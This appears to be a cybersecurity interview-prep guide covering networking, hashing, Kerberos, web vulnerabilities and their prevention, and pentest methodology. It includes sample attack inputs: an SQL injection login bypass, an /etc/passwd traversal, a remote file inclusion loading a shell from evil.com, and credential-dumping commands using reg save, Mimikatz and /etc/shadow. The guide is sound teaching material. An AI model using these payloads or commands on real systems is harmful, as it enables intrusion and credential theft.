### **1. What is the OSI model and what are its layers?**

The **OSI (Open Systems Interconnection) model** is a conceptual framework used to understand and standardize the functions of a telecommunication or computing system into 7 distinct abstraction layers.

**The 7 Layers (From Top to Bottom):**

1. **Physical (1):** Raw bitstream over physical medium (cables, hubs, voltages).

2. **Data Link (2):** Node-to-node transfer, error correction from Physical layer (Switches, MAC addresses, ARP).

3. **Network (3):** Routing, logical addressing (Routers, IP addresses, Packets).

4. **Transport (4):** End-to-end connections, reliability (TCP, UDP, Ports).

5. **Session (5):** Manages sessions/dialog between apps (NetBIOS, RPC).

6. **Presentation (6):** Translation, encryption/decryption, compression (SSL/TLS, JPEG, ASCII).

7. **Application (7):** User-end interface (HTTP, FTP, SMTP).

---

### **2. What is the difference between TCP and UDP?**

|Feature|TCP (Transmission Control Protocol)|UDP (User Datagram Protocol)|
|---|---|---|
|**Connection**|Connection-oriented (3-way handshake)|Connectionless (send and pray)|
|**Reliability**|Guaranteed delivery, no data loss|No guarantee; "Best effort"|
|**Ordering**|Orders packets (sequencing)|No inherent ordering|
|**Speed**|Slower (due to overhead/ACKs)|Faster (low overhead)|
|**Use Cases**|Web (HTTP), Email (SMTP), FTP|Streaming, VoIP, DNS, DHCP|

---

### **3. What are some of the most common services and what ports do they run on?**

- **FTP:** 20 (Data), 21 (Control)
    
- **SSH:** 22
    
- **Telnet:** 23
    
- **SMTP:** 25
    
- **DNS:** 53
    
- **HTTP:** 80
    
- **HTTPS:** 443
    
- **POP3:** 110
    
- **IMAP:** 143
    
- **SMB/NetBIOS:** 139, 445
    
- **RDP:** 3389
    
- **MySQL:** 3306
    
- **MSSQL:** 1433
    
- **PostgreSQL:** 5432
    
- **Kerberos:** 88
    
- **LDAP:** 389 / 636 (SSL)
    

---

### **4. What is DNS?**

**Domain Name System (DNS)** is the "phonebook of the internet." It translates human-readable domain names (e.g., `google.com`) into machine-readable IP addresses (e.g., `142.250.190.46`).

---

### **5. What is ARP?**

**Address Resolution Protocol (ARP)** is used to map a **Network layer** address (IPv4) to a **Data Link layer** address (MAC address). When a device knows an IP but needs the physical hardware address, it broadcasts an ARP request.

---

### **6. What is RDP?**

**Remote Desktop Protocol (RDP)** is a proprietary protocol developed by Microsoft that provides a user with a graphical interface to connect to another computer over a network connection. It runs on **port 3389**.

---

### **7. What is a MAC address?**

A **Media Access Control (MAC) address** is a unique 48-bit (6 pairs of hex) hardware identifier assigned to a Network Interface Card (NIC). It operates at Layer 2 and is "burned-in" to the device (though it can be spoofed).

---

### **8. What is a firewall and how does it work?**

A **firewall** is a security system that monitors and controls incoming/outgoing network traffic based on predetermined security rules.

- **How it works:** It establishes a barrier between a trusted internal network and an untrusted external network (like the internet). It inspects packets and allows or blocks them based on source/destination IP, port, or protocol.
    

---

### **9. What is the difference between an IDS and an IPS?**

- **IDS (Intrusion Detection System):** **Passive**. Monitors traffic and logs/alerts an admin of suspicious activity. It does **not** stop the traffic.
    
- **IPS (Intrusion Prevention System):** **Active**. Inline with the traffic flow; it can automatically block or drop malicious packets in real-time.
    

---

### **10. What are honeypots?**

A **honeypot** is a decoy system designed to lure attackers. It looks like a legitimate target but is actually isolated and monitored to study attacker behavior, detect new threats, or divert attackers away from real assets.

---

### **11. What is the difference between encoding, hashing and encrypting?**

- **Encoding:** Transforms data for usability (not security). It is reversible using the same algorithm. (e.g., Base64, ASCII). **No key required.**
    
- **Hashing:** One-way function. Maps data to a fixed-length value. It cannot be reversed. Used for integrity checks and passwords. (e.g., MD5, SHA-256).
    
- **Encrypting:** Two-way function. Transforms data to keep it secret. It requires a key to reverse (decrypt). (e.g., AES, RSA).
    

---

### **12. Name a few type of encoding, hash and encryption**

- **Encoding:** ASCII, Unicode, URL Encoding, Base64.
    
- **Hash:** MD5, SHA-1, SHA-2 (256/512), NTLM.
    
- **Encryption:** AES (Symmetric), RSA (Asymmetric), Blowfish, ChaCha20.
    

---

### **13. What is salting and what is it used for?**

**Salting** is the process of adding a unique, random string of characters to each password _before_ hashing it.

- **Why?** Prevents rainbow table attacks and ensures that two users with the same password do not have the same hash value.
    

---

### **14. What is the fastest way to crack hashes?**

1. **Leverage Hardware:** Using high-end GPUs (like NVIDIA RTX 4090s) with tools like **Hashcat** to brute-force billions of hashes per second.
    
2. **Online Services:** Using cloud GPU instances.
    
3. **Rainbow Tables:** Precomputed tables for reversing cryptographic hash functions (largely mitigated by salting).
    

---

### **15. Difference between symmetric and asymmetric encryption**

- **Symmetric:** Uses the **same key** to encrypt and decrypt. Fast, but key distribution is a problem. (e.g., AES, ChaCha20).
    
- **Asymmetric:** Uses a **public key** to encrypt and a **private key** to decrypt. Slower, but solves the key exchange problem. (e.g., RSA, ECC).
    

---

### **16. In what format are Windows and Linux hashes stored?**

- **Windows:** NTLM hashes (MD4) or LAN Manager (LM) hashes (deprecated). NTLM hashes are stored in the SAM file in a specific binary format (no salt).
    
- **Linux:** Typically `$type$salt$hash`. Common formats include `$y$` (yescrypt), `$6$` (SHA-512), `$5$` (SHA-256), or `$2y$` (bcrypt) in the `/etc/shadow` file.
    

---

### **17. Where are Windows and Linux hashes stored, how can you retrieve them?**

- **Windows:** Stored in `C:\Windows\System32\config\SAM`. **Retrieval:** Cannot be copied while OS is running (locked by kernel). Extracted via `reg save HKLM\SAM sam.save`, using Mimikatz (`lsadump::sam`), or dumping memory.
    
- **Linux:** Stored in `/etc/shadow`. **Retrieval:** Readable only by root. Extracted via `cat /etc/shadow` or `john --wordlist=rockyou.txt shadow`.
    

---

### **18. What are cron jobs/scheduled tasks?**

Mechanisms for scheduling scripts or commands to run automatically at specific times/dates.

- **Linux:** Cron jobs (managed via `crontab`).
    
- **Windows:** Scheduled Tasks (managed via `taskschd.msc` or `schtasks.exe`).
    

---

### **19. Where are cron jobs stored in Windows and Linux?**

- **Linux:** System-wide: `/etc/crontab`, `/etc/cron.d/`. User-specific: `/var/spool/cron/crontabs/`.
    
- **Windows:** `C:\Windows\System32\Tasks\` (XML format) and the Registry.
    

---

### **20. What are the different package managers used in Linux and where are they used?**

- **APT (Debian, Ubuntu):** `.deb` packages.
    
- **YUM / DNF (Red Hat, CentOS, Fedora):** `.rpm` packages.
    
- **Pacman (Arch Linux):** `.pkg.tar.zst` packages.
    
- **Zypper (openSUSE):** `.rpm` packages.
    
- **Portage (Gentoo):** Source-based.
    

---

### **21. Describe the permission system used in Linux file systems**

Linux uses a **DAC (Discretionary Access Control)** model.

- **Classes:** **U**ser (owner), **G**roup, **O**thers.
    
- **Permissions:** **R**ead (4), **W**rite (2), e**X**ecute (1).
    
- Represented as octal (e.g., `755`) or string (e.g., `-rwxr-xr-x`).
    

---

### **22. What are SUID and sudo?**

- **SUID (Set owner User ID):** A special permission bit. When set on an executable file, the program runs with the **owner's privileges**, not the user who executed it. (e.g., `passwd` runs as root). **Security Risk:** If set improperly, it can lead to privilege escalation.
    
- **Sudo:** A program that allows users to run programs with the security privileges of another user (default: root). Permissions are defined in `/etc/sudoers`.
    

---

### **23. What is Kerberos and how does it perform authentication?**

**Kerberos** is a network authentication protocol that uses "tickets" to allow nodes to prove their identity over a non-secure network.  
**How it works:**

1. Client requests a ticket from the **AS (Authentication Service)**.
    
2. AS gives back a **TGT (Ticket Granting Ticket)** encrypted with the user's password hash.
    
3. Client presents TGT to the **TGS (Ticket Granting Service)** to request access to a specific service.
    
4. TGS gives a **Service Ticket**.
    
5. Client presents Service Ticket to the target server.
    

---

### **24. What is the difference between WEP, WPA and WPA2?**

- **WEP (Wired Equivalent Privacy):** Broken. Uses RC4, weak IVs. Can be cracked in minutes.
    
- **WPA (Wi-Fi Protected Access):** Improved over WEP. Still used TKIP/RC4 but added per-packet key mixing and message integrity check (MIC).
    
- **WPA2:** Current standard. Mandates **AES** and **CCMP**. Replaced RC4 entirely. Vulnerable to KRACK (Key Reinstallation Attack).
    

---

### **25. What is WPS? Why is it insecure?**

**Wi-Fi Protected Setup (WPS)** is a network security standard designed to make connecting devices to a wireless network easier (push button or 8-digit PIN).

- **Why it's insecure:** The 8-digit PIN is split into two halves (4 digits + 3 digits + checksum). This reduces the total attempts to **11,000** possibilities, allowing it to be brute-forced in hours.
---
# SECTION 1: WEB APPLICATION VULNERABILITIES & ATTACKS

### 1. What is XSS, what types are there, consequences, and prevention?

**Cross-Site Scripting (XSS)** is a client-side code injection vulnerability where an attacker injects malicious scripts (usually JavaScript) into web pages viewed by other users.

**Types:**

1. **Reflected XSS (Non-Persistent):** The malicious script comes from the current HTTP request. The payload is reflected immediately in the response (e.g., search results, error messages). Requires the victim to click a crafted link.
    
2. **Stored XSS (Persistent):** The malicious script is permanently stored on the target server (database, comment field, forum post). The victim retrieves the script when requesting the stored information.
    
3. **DOM-based XSS:** The vulnerability exists in client-side JavaScript code, not the server response. The payload never reaches the server; it modifies the DOM environment.
    

**Consequences:**

- Session hijacking (stealing cookies).
    
- Defacement of the website.
    
- Redirecting users to malicious sites.
    
- Performing actions on behalf of the user (e.g., password change, wire transfer).
    
- Keylogging, phishing (capturing credentials via fake forms).
    

**Prevention:**

- **Contextual Output Encoding:** Encode data before inserting it into HTML, JavaScript, CSS, or URL contexts (e.g., `&` -> `&amp;`).
    
- **Use safe frameworks:** Modern frameworks (React, Angular) auto-escape by default.
    
- **Content Security Policy (CSP):** A browser header that restricts which sources scripts can be loaded from.
    
- **Input Validation:** Whitelist expected characters (not a primary defense).
    

---

### 2. What is SQL Injection, types, examples, and how to prevent?

**SQL Injection (SQLi)** is a server-side vulnerability where an attacker interferes with the queries an application makes to its database, allowing them to view/modify data they should not access.

**Types:**

1. **In-band (Classic):** Uses the same channel to launch attack and gather results (e.g., Union-based, Error-based).
    
2. **Inferential (Blind):** No data is transferred via the web application. Attacker reconstructs data by sending payloads and observing responses.
    
    - _Boolean-based:_ Different page content (True/False).
        
    - _Time-based:_ Database pauses (e.g., `WAITFOR DELAY`).
        
3. **Out-of-band:** Data is exfiltrated via a different channel (e.g., HTTP/DNS requests to attacker server).
    

**Example:**

- Vulnerable: `SELECT * FROM users WHERE username = '$username';`
    
- Input: `admin' OR '1'='1' --`
    
- Result: `SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ';` (Bypasses login)
    

**Prevention:**

- **Parameterized Queries (Prepared Statements):** Defines the SQL code structure first, passes parameters separately (No concatenation). _The ONLY definitive defense._
    
- **Stored Procedures:** (If implemented safely).
    
- **Allow-list Input Validation:** For expected items (e.g., table/column names).
    
- **Principle of Least Privilege:** App DB user should not be `sa`/`root`.
    

---

### 3. Secure and HTTPOnly Flags

These are flags set on **HTTP Cookies** to enhance security.

- **Secure Flag:** Instructs the browser to only send the cookie over **encrypted HTTPS** connections, never HTTP. Prevents network sniffing attacks.
    
- **HTTPOnly Flag:** Prevents client-side JavaScript (e.g., `document.cookie`) from accessing the cookie. **Critical mitigation against XSS attacks.** Even if an attacker can run JS, they cannot steal the session cookie.
    

---

### 4. What is CSRF, what does it entail, and how can it be prevented?

**Cross-Site Request Forgery (CSRF)** forces an authenticated user to execute unintended actions on a web application in which they are currently authenticated.

- **Entails:** Attacker tricks victim into visiting a malicious site. That site sends a forged request (e.g., `POST` to `/changePassword`) to the vulnerable app. The browser automatically includes the victim's session cookie, making the request appear legitimate.
    

**Prevention:**

- **Anti-CSRF Tokens (Synchronizer Tokens):** A unique, secret, unpredictable token embedded in the request (form/hidden field). Server validates token on state-changing requests.
    
- **SameSite Cookies:** Set `SameSite=Strict` or `Lax` attribute on cookies, preventing them from being sent in cross-site requests.
    
- **Double Submit Cookies.**
    
- **Re-authentication** for critical actions (password change, money transfer).
    

---

### 5. What is IDOR, consequences, and prevention?

**Insecure Direct Object References (IDOR)** is an access control vulnerability that occurs when an application provides direct access to objects (files, database records) based on user-supplied input, without verifying the user is authorized to access that object.

**Example:**

- URL: `https://example.com/download?invoice=12345`
    
- Attacker changes it to: `.../download?invoice=12346` and accesses another user's invoice.
    

**Consequences:**

- Horizontal Privilege Escalation: Accessing same-level peers.
    
- Vertical Privilege Escalation: Accessing admin-level objects.
    

**Prevention:**

- **Implement proper Access Control Checks:** Verify the authenticated user has permission to access the requested object on _every_ request.
    
- **Use indirect references:** Map direct IDs to random, unpredictable UUIDs or indirect reference maps.
    
- **Do not expose database keys** in URLs/APIs.
    

---

### 6. What are LFI and RFI? Consequences and Prevention?

**File Inclusion** vulnerabilities allow an attacker to include files on the server through the web browser.

- **LFI (Local File Inclusion):** Includes files **already present** on the target server.
    
    - _Example:_ `http://site.com/page=../../../../etc/passwd`
        
- **RFI (Remote File Inclusion):** Includes files from an **external remote server**. (Less common in modern PHP configs due to `allow_url_include=Off`).
    
    - _Example:_ `http://site.com/page=http://evil.com/shell.txt`
        

**Consequences:**

- **LFI:** Reading sensitive files, log poisoning leading to RCE (Remote Code Execution).
    
- **RFI:** Direct Remote Code Execution (loading a web shell), Defacement, Data theft.
    

**Prevention:**

- **Avoid dynamic file includes** based on user input.
    
- **Whitelist allowed files:** Use a static mapping (e.g., `page=1` maps to `home.php`).
    
- Disable dangerous PHP configurations (`allow_url_fopen`, `allow_url_include`).
    

---

### 7. How can you secure data in transit?

**Data in Transit** (moving between devices/networks) is secured via **Cryptography**.

1. **TLS (Transport Layer Security):** The standard protocol (replaced SSL). Encrypts the communication channel between client and server.
    
2. **HTTPS:** HTTP over TLS (Port 443).
    
3. **Strong Ciphers:** Disable weak protocols (SSLv2, SSLv3, TLS 1.0/1.1), use TLS 1.2+.
    
4. **VPNs (IPsec, OpenVPN):** Encrypt entire network tunnels.
    
5. **SSH:** Secure remote administration.
    
6. **SFTP/FTPS:** Secure file transfer.
    

---

# SECTION 2: PENETRATION TESTING INTERVIEW QUESTIONS (GENERAL)

### 1. What are the phases in the penetration testing lifecycle?

1. **Reconnaissance (Information Gathering):** Passive/Active gathering of intel.
    
2. **Scanning/Enumeration:** Using tools to scan ports, services, vulnerabilities (Nmap, Nessus).
    
3. **Gaining Access (Exploitation):** Executing exploits to compromise a system.
    
4. **Maintaining Access (Persistence):** Installing backdoors, rootkits (Scope defined; usually proof-of-concept only).
    
5. **Covering Tracks:** Clearing logs (Often not performed in standard commercial tests; more relevant for Red Teams).
    
6. **Reporting:** Documenting findings, risks, and remediation.
    

---

### 2. What types of penetration testing assessments are there?

- **Internal:** Simulating an attacker on the internal network (behind the firewall).
    
- **External:** Simulating an attacker on the internet; no initial access.
    
- **Web Application:** Focused on web apps, APIs.
    
- **Wireless:** Testing Wi-Fi networks (WPA2, WPA3, RADIUS).
    
- **Mobile:** iOS/Android application security.
    
- **Social Engineering:** Phishing campaigns, physical impersonation.
    
- **Physical:** Attempting to breach physical security (doors, tailgating).
    

---

### 3. Difference between active and passive reconnaissance?

- **Passive:** Gathering information without directly interacting with the target. The target has no way of knowing they were observed. (OSINT: Google dorking, WHOIS, social media, job postings).
    
- **Active:** Directly interacting with the target. (Port scanning, OS fingerprinting, visiting the website). **High risk of detection.**
    

---

### 4. How are penetration tests classified?

Primarily classified based on the amount of information provided to the tester:

1. **Black Box (Zero Knowledge):** Tester has no prior knowledge. Simulates an external attacker.
    
2. **White Box (Full Knowledge):** Tester has full access to architecture diagrams, source code, credentials. Simulates an insider; allows for deeper, faster assessment.
    
3. **Grey Box (Partial Knowledge):** Hybrid model. Tester has some credentials or login access to the application. _Most common for web app pentests._
    

---

### 5. What types of penetration testing teams are there and what are their responsibilities?

- **Red Team:** Offensive. Simulates adversaries to test defenses. Goal: Achieve specific objectives (get flag, exfiltrate data). They emulate TTPs (Tactics, Techniques, Procedures).
    
- **Blue Team:** Defensive. Monitors, detects, and responds to intrusions (SOC, Incident Response).
    
- **Purple Team:** Collaboration. Red and Blue work together to maximize capability improvement via immediate feedback loops.
    

---

### 6. What are some of the types of attackers?

- **Script Kiddie:** Unskilled individuals using pre-made tools/scripts. Low sophistication.
    
- **APT (Advanced Persistent Threat):** Nation-state sponsored. Highly skilled, well-funded, stealthy, long-term objectives (espionage, sabotage).
    
- **Malicious Insider:** An employee, contractor, or trusted partner with internal access. Can be accidental or intentional.
    
- **Hacktivist:** Attacker motivated by political or social agendas (defacing websites, DDoS).
    
- **Cybercriminal:** Motivated by financial gain (ransomware, credit card theft).
    

---

### 7. What are the most common types of malware?

- **Virus:** Self-replicating, attaches to clean files.
    
- **Worm:** Self-replicating, spreads across networks without human interaction.
    
- **Trojan:** Disguises as legitimate software.
    
- **Ransomware:** Encrypts data and demands payment.
    
- **Spyware:** Secretly records user activity.
    
- **Rootkit:** Designed to gain administrative control while hiding presence.
    
- **Keylogger:** Records keystrokes.
    

---

### 8. What are some of the most common vulnerability databases?

- **NVD (National Vulnerability Database):** U.S. government repository of standards-based vulnerability management data (CVSS scores, CPEs).
    
- **CVE (Common Vulnerabilities and Exposures):** Dictionary of publicly disclosed vulnerabilities (assigned IDs: `CVE-YYYY-N`).
    
- **Exploit-DB:** Archive of public exploits and corresponding vulnerable software (maintained by OffSec).
    
- **Packet Storm:** Security resource site with exploits, advisories, tools.
    
- **VulnHub:** Provides vulnerable virtual machines for practice.
    

---

### 9. What is the Common Vulnerability Scoring System?

**CVSS** is a free and open industry standard for assessing the severity of security vulnerabilities.

- **Scores:** Ranging from 0.0 to 10.0.
    
- **Metrics:** Base (intrinsic characteristics), Temporal (changes over time), Environmental (customized to specific organization).
    
- **Rating:** 0.0 = None, 0.1-3.9 = Low, 4.0-6.9 = Medium, 7.0-8.9 = High, 9.0-10.0 = Critical.
    

---

### 10. How would you rate vulnerabilities during a penetration test?

Using a **Risk Matrix**.  
**Risk = Likelihood x Impact**

1. **Likelihood:** How easy is it to exploit? (Authentication required? User interaction? Complexity?)
    
2. **Impact:** What data is exposed? (PII? Financial? Availability loss?) Ransomware vs. Information leak.  
    We combine the technical severity (CVSS) with **business context** to assign a priority (Critical, High, Medium, Low, Info).
    

---

### 11. At what point of an assessment would you start performing testing?

After **Scoping and Rules of Engagement (RoE)** have been signed off.

- Authorization letter is in place.
    
- Target scope (IPs/URLs) is defined.
    
- Testing times/dates are agreed upon.
    
- DoS testing permissions are clarified.
    
- Contacts for emergency stop are identified.
    

---

### 12. What are some of the most common vulnerabilities?

Based on the OWASP Top 10 and CWE Top 25:

- Broken Access Control (IDOR)
    
- Cryptographic Failures (Sensitive data exposure)
    
- Injection (SQL, NoSQL, Command)
    
- Insecure Design
    
- Security Misconfiguration (Default creds, verbose errors)
    
- Vulnerable and Outdated Components
    
- Identification and Authentication Failures
    
- Software and Data Integrity Failures
    
- Security Logging and Monitoring Failures
    
- Server-Side Request Forgery (SSRF)
    

---

### 13. What is the principle of least privilege?

The security concept that a user, program, or process should be given **only the minimum levels of access/permissions** necessary to perform its function—and **no more**.

- _Example:_ A web server does not need to run as `root/Administrator`; it should run as a low-privileged service account. A user in Marketing does not need access to Finance shares.